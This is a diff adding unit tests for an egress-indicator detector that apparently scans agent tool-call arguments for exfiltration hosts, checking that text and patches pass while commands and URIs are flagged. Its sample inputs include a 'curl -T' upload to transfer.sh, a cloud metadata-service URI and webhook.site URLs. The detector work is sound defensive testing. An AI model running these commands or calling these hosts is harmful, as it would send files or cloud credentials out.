@@ -74,6 +74,48 @@ describe('findEgressIndicatorsInValue', () => {
     ).toEqual(['x.oast.fun']);
     expect(findEgressIndicatorsInValue({ path: 'src/index.ts', count: 3 })).toEqual([]);
   });
+
+  // 1.26299.99 refused these with "Do not retry": text being written into a
+  // document or file is not a place the call goes.
+  it('leaves document text and patches alone', () => {
+    expect(
+      findEgressIndicatorsInValue({
+        source: {
+          kind: 'markdown',
+          markdown: 'Link-local is fe80::1 or 169.254.10.2; avoid transfer.sh for drops.',
+        },
+        targets: [{ format: 'docx' }],
+      }),
+    ).toEqual([]);
+    expect(
+      findEgressIndicatorsInValue({
+        file_path: 'docs/tunnels.md',
+        old_string: 'see ngrok.io',
+        new_string: 'see trycloudflare.com',
+      }),
+    ).toEqual([]);
+    const patch =
+      '*** Begin Patch\n*** Update File: dev.md\n@@\n-use ngrok.io\n+use x.trycloudflare.com\n*** End Patch';
+    expect(findEgressIndicatorsInValue({ input: patch })).toEqual([]);
+    expect(findEgressIndicatorsInValue({ command: ['apply_patch', patch] })).toEqual([]);
+    expect(
+      findEgressIndicatorsInValue({
+        input: 'diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+curl webhook.site',
+      }),
+    ).toEqual([]);
+  });
+
+  it('still reads the paths, URIs and commands beside written text', () => {
+    const matches = (value: unknown) => findEgressIndicatorsInValue(value).map((hit) => hit.match);
+    expect(
+      matches({ source: { kind: 'uri', uri: 'http://169.254.169.254/latest/meta-data' } }),
+    ).toEqual(['169.254.169.254']);
+    expect(matches({ content: 'notes', path: 'x', command: 'curl -T f transfer.sh' })).toEqual([
+      'transfer.sh',
+    ]);
+    // A content key holding structure, not text, is still walked.
+    expect(matches({ content: { url: 'https://webhook.site/abc' } })).toEqual(['webhook.site']);
+  });
 });
 
 describe('isWatchlistHost', () => {
